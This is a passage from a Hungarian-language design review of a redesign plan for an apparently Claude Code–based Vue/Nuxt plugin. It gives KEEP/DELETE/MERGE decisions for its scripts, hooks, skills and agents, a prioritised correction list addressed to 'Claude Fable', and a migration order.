- S: a §7 két hibás készrejelentés után visszaépítené a Stop-runnert, miközben §9 tiltja a körvégi projektfuttatást. A hibajelzés vizsgálatot indítson, ne automatikus architekturális visszaépítést.
- S/I: egymásra épülő fázisoknál nem általánosan elég egy tetszőleges fázis `git revert`-je. Későbbi fogyasztók már az új felületet igényelhetik. A függő változásokat fordított sorrendben vagy egységes rollbackkel kell kezelni.

**Elfogadás:** a felsorolt ellentmondások egyike sem marad a javított tervben. A pontos sorszám helyett szükség szerint függvény-/szakasznév is segíti a végrehajtást. A fizetős vagy platformfüggő ellenőrzések elmaradása dokumentált állapot, nem hamis siker.

### F15 — A `pack-graph` karcsúsítása és a sorplafonok inkább áthelyezik a komplexitást

**Súlyosság: MEDIUM. Kötelező döntési korrekció; a modul összevonása opcionális.** Terv: §6.1, §6.3; audit §4–5.

**Hely:** `scripts/pack-graph.mjs:1–12, 35–90`; `.claude/skills/pack-parity/SKILL.md`; terv `:615–621, 639–645`.

**Bizonyíték:** S: a modul már a bevezetőben jövőbeli React/Next családok automatikus támogatásával indokolja magát. A `packs()` a manifestek mellett referenciákat és evalmappákat is bejár. A terv a referenciapárosítást a skill prózájába helyezi, de a külön graph CLI-t és családmodellt megtartja.

**Miért szuboptimális:** a párosítási szabály továbbra is karbantartandó algoritmus marad. A manifestekből szükséges pluginlista indokolt lehet a validátorban; ebből nem következik általános graph-jelentés és jövőbeli frameworkcsaládok modellezése. A 90/120/430 soros plafonok tömörítéssel, adatfájlba vagy promptba helyezéssel is teljesíthetők valódi egyszerűsödés nélkül.

**Legegyszerűbb korrekció:** törölje a report CLI-t és a referenciapárosítás automatizálását; a Vue→Nuxt tényleges szakmai eltéréseit közvetlenül lehet review-zni. Csak a validátor által ténylegesen szükséges manifestolvasás maradjon, akár a validátorban, akár egy kis, indokolt modulban. A `runAsEntry` kompatibilitási réteg megszüntethető a már választott Node-floor mellett.

**Elfogadás:** nincs új graph-/schema-absztrakció, nincs prózába áttelepített mechanikus fájlpárosítás. A jelentés kód-, konfiguráció-, tesztadat- és promptfelületet egyaránt számol; az alrendszerek, állapotok és fogyasztói szerződések számának csökkenése fontosabb a sorszámcélnál.

## 4. Mit indokolt megtartani, és mit nem?

Ez a döntési tábla a terv által megőrzött fő elemeket is megtartási bizonyításra kötelezi. A „KEEP” itt sem örök felmentés.

### Minden megmaradónak szánt saját script és hook

| Elem | Valós feladat | Javasolt döntés és indok |
| --- | --- | --- |
| Új `guard.mjs` | Alapértelmezett balesetvédelem | A tervezett shellrész DELETE. Legfeljebb strukturált fájleszköz-guard, az F01–F02 feltételeivel. A nulla hook is legitim cél, ha a választott termékszerződést a natív konfiguráció teljesíti. |
| `lib/credential-paths.mjs` | Snapshotból kizárandó érzékeny utak | KEEP, amíg a snapshotnak kell. Ha egyetlen fogyasztó marad, beolvasztható. Egyetlen útvonalszabály legyen; ne legyen külön shell-regex-változata. |
| `run-gates.mjs` | Projektparancsok kiválasztása, futtatása és értelmezése | DELETE — F03. A projekt saját scriptje és a natív futtató elég a szükséges alapfeladathoz. |
| `project-facts.mjs` | Többféle projektadat egységes injektálása | DELETE — F04. Feladathoz kötött olvasás helyettesíti, nem új metaadatservice. |
| `snapshot.mjs` | Untracked és tracked változások közös review-alapja, az index átírása nélkül | KEEP szűkített felelősséggel — F05–F06. Ez demonstrálható többlet; a checkpoint nem teljes helyettesítő. |
| `scripts/validate.mjs` | A plugin saját, natív CLI által nem fedett invariánsai | KEEP, szűkítve. E: a frontmatter-elírást a saját ellenőrzés fogta, a natív 2.1.292 nem. Ne írjon általános YAML-/Markdown-validátort. |
| `scripts/pack-graph.mjs` | Validátoradat és szerzői graph-report összekeverve | A report/családautomatizmus DELETE; csak a szükséges manifestolvasás maradjon — F15. |
| `scripts/ci/release-notes.mjs` | A választott CHANGELOG-szakasz kiemelése | KEEP. A GitHub automatikus release notes nem azonos a gondozott CHANGELOG kiemelésével. Kis tiszta függvény, tényleges CI-fogyasztó. A betöltési wrapper nem szükséges. |
| `scripts/hooks/on-stop.mjs` | Repo-validáció megismétlése a kör végén | DELETE — F08. |
| `scripts/test/helpers.mjs` és tesztfixture-ök | Elkülönített, ártalmatlan helyi tesztek | Csak a megmaradó viselkedési tesztekhez szükséges rész KEEP. Ne maradjon fizetős CLI-emulátor, általános scenario-DSL vagy minden meghívás előtti duplikált szintaxisellenőrzés. |

A validátor nyolc tervezett maradó checkje közül a frontmatter, a betölthető komponensstruktúra, a valóban használt referenciák és scripts/hookcélok, továbbá a saját közös verzió-/changelog-szabály indokolható. A `skill-dirs` és `plugin-root` szerkezeti ellenőrzés összevonható, ha ugyanazt járja be. A 6500-as aggregált leírásbudget repo-policy, nem bizonyított natív betöltési limit; tartsa csak akkor kemény kapunak, ha megnevezhető a megelőzött probléma. A natív `/skill-doctor` használati/költségadata hasznosabb lehet a tényleges hatás megítéléséhez. Ez dokumentált lehetőség, ebben a review-ban nem futtatott mérés. [Skill-dokumentáció](https://code.claude.com/docs/en/skills).

### Skillek, agentek és konfiguráció

| Csoport | Javaslat |
| --- | --- |
| `vue-engineering`, `nuxt-engineering` és szakmai referenciák | KEEP. A konkrét Vue-reaktivitási, Nuxt SSR-/adatlekérési és verziófüggő hibák megelőzése a termék valódi szakterülete. A gépi facts-flagekre és tiltott shellparancsokra támaszkodást törölni kell. |
| `clarifying-features`, `designing-architecture`, `planning-features` | Egy egyszerű tervezési folyamatba MERGE; a különböző gondolkodási szempontok maradhatnak rövid referenciák. Ne követeljenek külön szertartást minden feladatra. |
| `executing-plans`, `finishing-features` | A külön eseménynapló-/státuszprotokoll DELETE; egyszerű végrehajtási és átadási szabály maradhat. A natív feladatkezelés/folytatás lehetőségeit vizsgálni kell, egyenértékűséget előre állítani nem. |
| `investigating-bugs`, `fixing-bugs` | MERGE egy diagnózis→javítás folyamattá; csak a saját frontend-többlet maradjon a natív debug-funkciók fölött. |
| `reviewing-changes`, `core:reviewer` | Egy reviewer és a projektspecifikus checklist KEEP; automatikus lencse-/verifierlánc DELETE alapértelmezésként. |
| `core:implementer` | Opcionális delegálási szerepként megtartható; sem minden taskra kötelező külön agent, sem nagy dispatch-séma nem következik ebből. |
| `testing-changes`, `verifying-ui` | A felhasználói forgatókönyv és böngészőben ellenőrzött eredmény értékes. MERGE/egyszerűsítés; ne inferáljon MCP-engedélyt settingsfájlokból, ne építsen új felfedezőréteget. |
| `preparing-a-repo` | A keretrendszer-specifikus hiányok rövid ellenőrzése maradhat. Az általános környezet-/beállításdiagnosztika natív megfelelőjével való átfedést törölni kell. |
| `describing-changes` | Rövid repo-konvenció/reference elég lehet; a natív commit/PR-munka köré nem indokolt teljes facts-injektálás. Külön skill megtartása mérendő, nem bizonyított. |
| `syncing-branches` | Csak a ténylegesen szükséges git-helyreállítási/konfliktustudás maradjon. A log-/gate-/snapshot-állapotgép egyszerűsítendő az F05 szerint; destruktív műveleti védelem nem törölhető vele együtt. |
| `optimizing-prompts` | DELETE a frontend-plugin alapfelületéből. Általános promptátírás, bemutatott frontend-specifikus többlet nélkül. Szükség esetén személyes skill lehet. |
| Repo `trigger-tester` | A tényleges routingmérés helyett tüzelést jósoló persona DELETE/MERGE. A description-review módszertana lehet rövid referencia; nem mérési bizonyíték egy agent véleménye. |
| Repo `eval-grader` | A `.claude/agents/eval-grader.md:16–18, 43–66` szintetikus válaszokkal a rubrikát teszteli, tehát nem egyszerűen a natív eval-grader másolata. Ez indokolható szerzői ellenőrzés. Külön agent helyett rövid checklistbe MERGE opcionális; automatikus kötelező kapuvá nem kell tenni. |
| Repo `contract-auditor` | Az átállás ellenőrzéséhez hasznos lehet; a megszüntetett JSON-/ledger-szerződések miatt létrejött részei DELETE. Nem szabad saját mesterséges protokollját fenntartó állandó őrré válni. |
| Repo `component-reviewer`, `body-vs-reference-audit`, `pack-parity` | A checklist értékesebb lehet, mint három külön karbantartási rítus. MERGE szerzői útmutatóba, ha nincs külön mérhető feladatuk. |
| Repo `release`, `new-pack`, `cli-upgrade-check`, `windows-check`, `try-unreleased`, `diagnosing-sessions`, `eval-case` | A tényleges műveleti útmutatók maradhatnak vékonyan. Saját driver/probe/scaffolding helyett natív parancsok; külön meta-skill csak igazolt, ismétlődő munkára. A transcriptdiagnózis nem indokol új automatikus telemetriát. |
| `devkit.config.json` | A stopHook/docs részek DELETE. Ha kizárólag egy indokolatlan budget maradna, az egész fájl DELETE. Ne maradjon konfiguráció saját létjogosultsága kedvéért. |
| `.mcp.json` | F09 szerinti explicit döntés. A plugin használatához szükséges böngészőkapcsolat és a repo szerzőjének automatikusan betöltődő eszköze nem ugyanaz. |

A skillek összevonásának pontos végső neve opcionális. A kötelező korrekció az, hogy a terv ne nyilvánítsa ezt az egész réteget vizsgálaton kívülinek: minden külön megmaradó belépési ponthoz konkrét, natív működésen felüli feladatot kell megneveznie. A natív `/doctor`, `/debug`, `/run`, `/verify`, `/code-review` és `/skill-doctor` dokumentált elérhetősége összehasonlítási alap; nem bizonyítja automatikusan a frontend-specifikus viselkedés egyenértékűségét. [Beépített skill-lehetőségek](https://code.claude.com/docs/en/skills).

## 5. Helyes döntések, amelyeket a javított tervnek meg kell őriznie

- A saját Claude wire-protokollos driver, scenario-futtató, fake CLI és windows-probe rendszer törlése. Nincs indok a natív CLI életciklusát újraimplementálni.
- A fogyasztói formázó- és Stop-hook, cache/fingerprint/session-state eltávolítása. Az explicit formázás és ellenőrzés maradjon a feladatfolyamatban.
- A `run.mjs`, a külön plugin-validate és release-warning wrapper törlése. E: a natív `--strict` kilépési kódja az ismeretlen manifestmezőt hibának jelzi; nincs szükség kimeneti díszkarakter keresésére.
- A saját általános Markdown-link-/anchor- és dokumentációbeli MCP-névellenőrzés törlése. Ez nem jelenti a tényleges runtime-hivatkozások ellenőrzésének megszüntetését.
- A natív CLI által ebben a verzióban nem ellenőrzött skill-/agent-frontmatter szűk saját validációja. A pluginagent `permissionMode`, `hooks`, `mcpServers`, `initialPrompt` mezőinek figyelmen kívül hagyása dokumentált; az audit ide vonatkozó korrekciója helyes. [Plugin-komponensek](https://code.claude.com/docs/en/plugins/components).
- A reviewer Bash-hozzáférésének megszüntetése, az F10 függőségeinek rendezésével.
- A project-facts MCP-engedélyemulációjának, portregexének és TS-verzióra épített spekulatív blokkolásának törlése. Az F04 szerint ennél tovább kell menni.
- A tag–manifest–CHANGELOG konzisztenciakapu, a rögzített CLI és a platformmátrix megtartása. Ezek konkrét kiadási/cross-platform hibákat fednek, nem önmagukért létező agentfolyamatok.
- A függőségmentes Node-tooling és az új SDK/CLI-driver tiltása.

A közvetlen `command` + `args` hookindítás dokumentált lehetőség; nem kell hozzá betöltőwrapper. Az egy eseményre illeszkedő hookok párhuzamos futása miatt két folyamat indulási idejének összege nem automatikusan a felhasználó által látott késleltetés. A wrapper törlését egyszerűbb indokolni a felelősség megszűnésével, mint pontatlan teljesítményösszeggel. [Hook-dokumentáció](https://code.claude.com/docs/en/hooks).

## 6. Prioritásos átadási lista Claude Fable számára

Az alábbi sorrend a **terv átírásának**, majd a jóváhagyott migrációnak a függőségeit rögzíti. Nem felhatalmazás a redesign mostani végrehajtására.

| Prioritás | Kötelező korrekció | Ellenőrizhető elfogadás |
| --- | --- | --- |
| P0 | F01: a támogatott védelem és migráció szerződése | Platformonkénti effektívsettings-mátrix, régi fogyasztó átállása, kötelező kiadás előtti bizonyíték; nincs „snippet = teljes határ” állítás. |
| P0 | F02: az új shellguard elhagyása | Nincs parser/helyettesítő regexmotor; minden maradó fájlguard-szabályhoz konkrét indok. A régi védelem csak a migráció rendezett állapotában törlődik. |
| P1 | F03–F04: runner és facts DELETE | Teljes író-/olvasólista; a fogyasztók explicit workspace-, parancs- és eredményadatot használnak; nincs helyettesítő JSON-API vagy runner. |
| P1 | F05–F06: snapshot szerepének szűkítése | Review-tree nem backupgarancia; helyreállítás külön, szükséges bizonyítékkal; exkluzív célfájllétrehozás. |
| P1 | F07: lifecycle és review egyszerűsítése | Nincs kötelező hatfájlos állapotprotokoll, naplóarchiváló algoritmus vagy automatikus többagentű review. Egy meglévő feature folytatási útja világos. |
| P1 | F09–F10: függőségi lezárás | Minden megnevezett teszt, aktív referencia, agent- és packutasítás együtt változik; nincs Bash-t igénylő read-only reviewer. |
| P1 | F12: bizalmi modell javítása | Hook, tool permission és sandbox elkülönül; automatikus projektkódfuttatás nem kerül vissza más néven. |
| P2 | F08, F15: repo-hook és graph-réteg törlése | Nincs új on-stop teszt/watch-konfiguráció/report CLI; csak valóban fogyasztott manifestolvasás marad. |
| P2 | F11, F13: natív ellenőrzés és CI pontosítása | Valóban látható canaryhiba; natív scaffolding; külön pluginhook-eval és consumer-settings-smoke; nincs saját futtató. |
| P2 | F14: végrehajtható terv | Helyes shell, forráshelyek, kezdeti változások megőrzése, függő rollback-sorrend, következetes DoD. |

### A javított migráció logikus sorrendje

1. **Rögzítés és hatókör:** aktuális forrásállapot, meglévő felhasználói módosítások, termékgaranciák és a végső komponenslista. Nem kell teljesen tiszta munkafát kikényszeríteni idegen változások eldobásával.
2. **Független tooling-törlések:** driver, fake CLI, probe-ok, duplikált validáció és wrapper; saját fogyasztóik, tesztjeik és aktív dokumentációjuk ugyanebben a lépésben változnak. A szükséges natív/frontmatter-ellenőrzés megmarad.
3. **Prompt-/munkafolyamat-fogyasztók átállítása:** explicit ellenőrzés, explicit workspace, kisebb átadási állapot. A facts és runner csak az utolsó szükséges fogyasztó eltávolítása után törlődik. A köztes hibásmanifest-megoldás előbb runnerbe, majd factsba költöztetése így felesleges.
4. **Automatikus projektfuttatás megszüntetése:** fogyasztói és repo-hookok törlése a helyettesítő explicit út meglétével; nincs új Stop-verzió.
5. **Védelmi átállás:** az F01 ellenőrzött feltételei után a régi shellőrök eltávolítása; legfeljebb az indokolt fájlguard marad. A felhasználó által ebben a review-ban tiltott fizetős futásokat a későbbi kiadás külön feladata kezeli.
6. **Snapshot és maradó validátor lezárása, CI, dokumentáció:** a csökkentett felület viselkedési tesztjei, aktív referenciák, kiadási migráció és platformellenőrzés. Csak ezek után nevezhető a redesign késznek.

Kisebb commitok használhatók, de minden commit zöld állapotát a tényleges függőségekhez kell igazítani. Nem szükséges minden lépéshez külön agent, új ellenőrzőscript vagy új séma.

## 7. Végső minimalitási teszt

A jelenlegi terv **kevesebb kódsort**, de továbbra is sok saját platformviselkedést eredményezne. A shellguard, runner, globális facts, repo Stop és Markdown-állapotgép együtt még mindig egy Claude Code köré épített második működési réteg.

A javasolt kisebb cél: frontend-specifikus tudás és rövid munkafolyamatok; egy opcionális, ténylegesen korlátozott reviewer; natív eszközfuttatás és beállítások; szűk snapshot-review segéd; a natív validátorból bizonyítottan hiányzó repo-invariánsok; egyszerű release-notes kiemelés. Saját hook csak külön igazolt, szűk fájleszköz-feladatra maradjon.

Minden újonnan megtartani kívánt egyedi mechanizmushoz válasz kell: **mely konkrét felhasználói eredmény romlik a törlésével, ezt mi bizonyítja, és miért nem elég hozzá a natív funkció vagy egy rövid közös utasítás?** A jelenlegi terv ezt több alapkomponensnél nem teljesíti. Ezért a végrehajtás előtt lényegi tervrevízió szükséges.
